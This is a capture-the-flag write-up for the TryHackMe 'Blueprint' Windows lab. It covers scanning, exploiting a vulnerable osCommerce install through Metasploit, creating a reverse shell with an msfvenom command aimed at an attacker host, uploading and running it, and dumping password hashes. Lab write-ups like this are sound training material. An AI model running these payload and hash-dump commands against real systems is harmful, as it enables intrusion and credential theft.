# **Description**

Hello hackers, I hope you are doing well. We are doing [Blueprint](https://tryhackme.com/room/blueprint) from [TryHackMe](https://tryhackme.com). It's an easy windows machine running a software program with a version vulnerable to remote code execution.

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Bash
Nmap scan report for 10.10.230.235

We have a windows machine, running a webserver on port 80 and port 8080, SMB and mysql.

## Web

Let's navigate to the webpage on port 8080.

![](/assets/img/tryhackme/blueprint/1.png)

It's a directory, let's see what it holds.

![](/assets/img/tryhackme/blueprint/2.png)

We see oscommerce with what we assume to be a version number. Let's search for **oscommerce** and see what we can find.

![](/assets/img/tryhackme/blueprint/3.png)

OsCommerce is an online store management software program, and it is vulnerable to remote code execution in this exact version this machine is running.


# **Foothold**

Let's download the exploit and run it.

![](/assets/img/tryhackme/blueprint/4.png)

Great! We got command execution and with elevated privileges.

If we opened up metasploit, we can see that it also has a module for exploiting this service and even getting a reverse shell.

![](/assets/img/tryhackme/blueprint/5.png)

Let's set the necessary parameters up and run the module.

![](/assets/img/tryhackme/blueprint/6.png)

Now let's dump the hashes.

![](/assets/img/tryhackme/blueprint/7.png)

We can't do that because the current meterpreter we're using (php/meterpreter) is not supported. Let's upgrade to **windows/meterpreter*.


# **Shell Stabilization**

First, we need to create an executable using msfvenom with this command.`msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker_IP LPORT=1234 -f exe -o shell.exe`

![](/assets/img/tryhackme/blueprint/8.png)

Great. Now we need to setup a listener on metasploit. We use **exploit/multi/handler** for that, and set the options LPORT, LHOST and payload. After that we run the module in the background with `run -j`.
>Press `ctrl + z` to background meterpreter and then select the handler.

![](/assets/img/tryhackme/blueprint/9.png)

Great! Now let's get back to our meterpreter session, and upload the executable.
> You need to start metasploit from the same directory where we created the executable, or specify the full path of the executable:(/path/to/the/executable.exe)

![](/assets/img/tryhackme/blueprint/10.png)

We uploaded the file successfully, now let's run it with the command `execute -f shell.exe`.

![](/assets/img/tryhackme/blueprint/11.png)

Great! We got our session. Now background the old meterpreter session with `ctrl + z` and select the new one, in my case it's session 10: `sessions -i 10`.

Now we can run `hashdump` and get local users hashes.
